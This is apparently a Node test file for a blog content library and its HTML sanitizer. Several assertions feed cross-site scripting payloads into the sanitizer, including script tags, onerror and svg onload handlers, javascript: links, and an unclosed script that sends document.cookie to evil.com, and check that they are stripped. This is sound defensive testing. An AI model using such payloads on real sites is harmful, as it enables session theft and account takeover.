import assert from "node:assert/strict";
import {
  looksLikeHtml,
  wrapPlainTextAsHtml,
  renderableBlogHtml,
  slugifyHeading,
  injectHeadingIds,
  extractHeadings,
  estimateReadingTime,
} from "@/lib/blog-content";
import { sanitizeBlogHtml } from "@/lib/blog-sanitize";

function main() {
  assert.equal(looksLikeHtml("<p>Hello</p>"), true, "should detect <p> as HTML");
  assert.equal(looksLikeHtml("Just plain text, no tags."), false, "should treat plain text as non-HTML");

  assert.equal(
    wrapPlainTextAsHtml("Hello <script>\n\nSecond paragraph"),
    "<p>Hello &lt;script&gt;</p>\n<p>Second paragraph</p>",
    "should escape and wrap paragraphs on blank-line boundaries"
  );

  const alreadyHtml = "<p>Already <strong>rich</strong></p>";
  assert.equal(renderableBlogHtml(alreadyHtml), alreadyHtml, "should pass real HTML through untouched");
  assert.equal(renderableBlogHtml("Plain text post"), "<p>Plain text post</p>", "should wrap legacy plain text");

  assert.equal(slugifyHeading("What's New in 2026?"), "what-s-new-in-2026", "should produce a url-safe slug");

  const injected = injectHeadingIds("<h2>Intro</h2><p>text</p><h2>Intro</h2>");
  assert.equal(
    injected,
    '<h2 id="intro">Intro</h2><p>text</p><h2 id="intro-1">Intro</h2>',
    "should dedupe heading ids"
  );

  const headings = extractHeadings(injectHeadingIds("<h2>First</h2><h3>Second</h3>"));
  assert.deepEqual(
    headings,
    [
      { id: "first", text: "First", level: 2 },
      { id: "second", text: "Second", level: 3 },
    ],
    "should extract headings using the ids injectHeadingIds assigned"
  );

  assert.equal(estimateReadingTime("<p>short</p>"), 1, "should floor reading time at 1 minute");
  const longText = `<p>${"word ".repeat(450)}</p>`;
  assert.equal(estimateReadingTime(longText), 3, "450 words at 200wpm should round up to 3 minutes");

  assert.equal(
    sanitizeBlogHtml('<p>Hello</p><script>alert(1)</script><p>World</p>'),
    "<p>Hello</p><p>World</p>",
    "should strip script tags"
  );
  assert.equal(
    sanitizeBlogHtml('<img src="x.png" onerror="alert(1)" alt="x">'),
    '<img src="x.png" alt="x">',
    "should strip inline event handler attributes"
  );
  assert.equal(
    sanitizeBlogHtml('<a href="javascript:alert(1)">click</a>'),
    "<a>click</a>",
    "should strip javascript: hrefs"
  );
  const safeContent = '<p>Hello <strong>world</strong></p><a href="https://example.com">link</a>';
  assert.equal(sanitizeBlogHtml(safeContent), safeContent, "should leave normal rich content untouched");

  const proseWithOnclickText = '<p>Use the onclick=handler() attribute to bind a click.</p>';
  assert.equal(
    sanitizeBlogHtml(proseWithOnclickText),
    proseWithOnclickText,
    "should not strip 'onclick=' when it appears as plain text, not a real attribute"
  );

  assert.equal(
    sanitizeBlogHtml('<svg/onload=alert(1)>'),
    "<svg>",
    "should strip event handlers delimited by '/' instead of whitespace"
  );

  assert.equal(
    sanitizeBlogHtml('<a href=" javascript:alert(1)">click</a>'),
    "<a>click</a>",
    "should strip javascript: hrefs with leading whitespace inside the quotes"
  );

  assert.equal(
    sanitizeBlogHtml('<p>before</p><script>fetch("//evil.com/"+document.cookie)'),
    "<p>before</p>",
    "should strip unclosed script tags through to end of string"
  );

  console.log("All blog-content and blog-sanitize checks passed.");
}

main();
